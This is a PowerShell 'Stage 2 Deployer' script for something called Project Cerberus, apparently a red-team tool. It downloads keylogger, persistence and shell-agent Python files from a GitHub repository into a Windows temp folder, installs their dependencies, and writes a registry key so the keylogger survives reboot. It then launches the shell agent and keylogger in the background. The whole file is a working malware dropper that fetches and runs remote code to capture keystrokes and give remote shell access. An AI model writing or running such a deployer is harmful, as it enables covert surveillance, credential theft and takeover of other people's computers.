# Project Cerberus - Stage 2 Deployer

$dir = "C:\Windows\Temp\cerberus"
$base = "https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/master/red-team/keylogger"

New-Item -ItemType Directory -Force -Path $dir | Out-Null

# Download: red-team/keylogger/config.py
Invoke-WebRequest -Uri "$base/config.py" -OutFile "$dir\config.py"

# Download: red-team/keylogger/keylogger.py
Invoke-WebRequest -Uri "$base/keylogger.py" -OutFile "$dir\keylogger.py"

# Download: red-team/keylogger/persistence.py
Invoke-WebRequest -Uri "$base/persistence.py" -OutFile "$dir\persistence.py"

# Download: red-team/keylogger/shell_agent.py
Invoke-WebRequest -Uri "$base/shell_agent.py" -OutFile "$dir\shell_agent.py"

# Download: red-team/keylogger/requirements.txt
Invoke-WebRequest -Uri "$base/requirements.txt" -OutFile "$dir\requirements.txt"

# Install all Python dependencies
pip install -r "$dir\requirements.txt" -q

# Run persistence.py — writes registry key so keylogger survives reboot
python "$dir\persistence.py"

# Launch shell_agent.py silently in background
Start-Process python -ArgumentList "$dir\shell_agent.py" -WindowStyle Normal

# Launch keylogger.py silently in background
Start-Process python -ArgumentList "$dir\keylogger.py" -WindowStyle Normal

# Keep window open so we can read any errors
Write-Host "`n[+] Deploy complete. Press any key to close..."
pause